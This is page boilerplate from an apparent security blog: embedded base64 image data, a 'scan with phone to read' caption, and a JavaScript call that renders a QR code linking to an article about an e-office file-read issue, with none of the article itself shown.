fELqFN4otvcQ99SnJl9hr4PcFfrNdzQP8cOI+vWJ6qJ6YdcgPStXYf4RlrdCX11XQPqpw8jVy1vROYx+GHn5zyekTuGNYnsPgXFaEA730dcC8clFGHUIh2DdSRX6Vwjf81ef6lsBqS1tHxAdguWtgHC9MHL1jlVboV7XFXIR0q9yFeqF5xNSp/BGcRgIZHrusSZY0XlpFV2XfxerV8WqrnIVMO4PwoFDKXD9q5Kqq9BQ1/tQF83JOz7K64esD0HrRH3ywsNANJ34mhPYBlLTqXAbdV0B43QhHILlqbBOhDEP4ZdLHFVTEXb7XlqFCox16mJ5DTVIjTqEwxx7HcSnbh8R5nmIDkH99oHosMZtIBad+NoTOAzEqUKmuOJd7y/DvLpchPSHoL4VwnO+fT2MNa6tRy6udEgfCOoXIXqvh7lunf49HgayT57Xv38C2yd1mE8TojtVCF9tVZ95mPuf9dlnhZD+cPtP0fbe1kK85iEcgt0H0fWbFyF5uQjRex1Eh6B+fYXnE+KpvAlun9TdD8ynZ76mWAGjzzyMenkrHuXLUwFjvXVieVahB8Ye3a9PXS6qi+rPonWQfch7vTrEB5z/GNDlzb62H1lOS4Tb1IBt28D10+8mtIte39JLCulrvWhB5xC/+Z8gjD1cA6JDsPeGua4PkrefulyE+MwXbgMpcsbrT+DwWxZkak5RhFHvW4fk1XsdjHkYuXUw182vsHRIrWuLEB1GNC9Wj3080nteLsK43r736vp8QlYn8yL98FvWo31Apq7Pu0GE5CGoLvY6+Qp7HaSvfgiH2+cQuGmA1u1/mdF7boavC/PA9f0Sgupfti0nF+G+H5LXb9/C8wnxVN4Et/cQ91NTqoBMEYKl7UM/JA/Bvaeu9XWE+CHY88/yWsOwRt4RshYE9a+w13dfz0P6qsPIrTcvqheeT0idwhvF8j3E6YmQaUNQXeyvCeKDEVf+lQ5jfV9nz2H0wshdQ4QxD3O+X6Ou4b4Pku/ryKtHBcQHNzyfkDqZN4rDQOA2LWDbqtMVgetvGRrU5R0f5fXrg3l/8yLEB7ffsszZU4SbF25+8+Kqvuf1rRCynnkIt88MDwOZmU7t907g8FuWSztVuQiZsnkIhxH165NDfPKOMM9DdBhxXw9jrq+tt+tyUd/lkisY+0a9XH9CwJiDG798fUG03l++x/MJ+Tq0d4Htt6z9lOp6tcHKVfR8aRVd77w8FV2XV65CLpZW0XlpPfRA7kz5CiE+COrrfeU937k+0fwzeD4hz5zSL3q29xDI3QHPoXvsd0Hn+mDsq0+E+3n7dIRbXc/ZW73zrq/ycFsDsGyJwPX9pRtg1CEcbng+If3UXsy3gXh3PMLVfiFTNm8fGHXzzyKkHoK9znUKe+5ZDmNvGHn1rrAfJA9BdbG8FXKxtIrOSzO2gWg68bUncBgIZOow4mqbEJ95CIegkzffOcx9MOqrOogPbuhaHeHmAba0vYHhZz+EQ3ArWFxAfDBit8M6fxhILz75757Afz4Q7zZfBuRuWPHu7/zZOn2F9oCsLa/cPiD5vVbX+jtWrkK9rivkYmkVnZdWoS5C9gGc/1zW5c2+/vMnpL8+74KO3Qe3uwTo6Y3bBxh+3m+GzwuY56z9tNz9A6mHEa2H6J3btOud64P0kRf+84HUImc8fwKHgTjNjquW+sxDpr7S9YkQv1y0HpLvvPvMF5oTIT0gqF7eCohe1/cC4rMe5hxGXX9H19rrh4Hsk+f175/ANhDIVOE+/nSL3g2Q/vZR7wjxqesXV7r5wkceGNeAcJhj9dxH7y8X9UL6dQ6jXvltIEXOeP0JnAN5/QyGHfwPAAD//9zlCQUAAAAGSURBVAMAsJl80SuMcjMAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 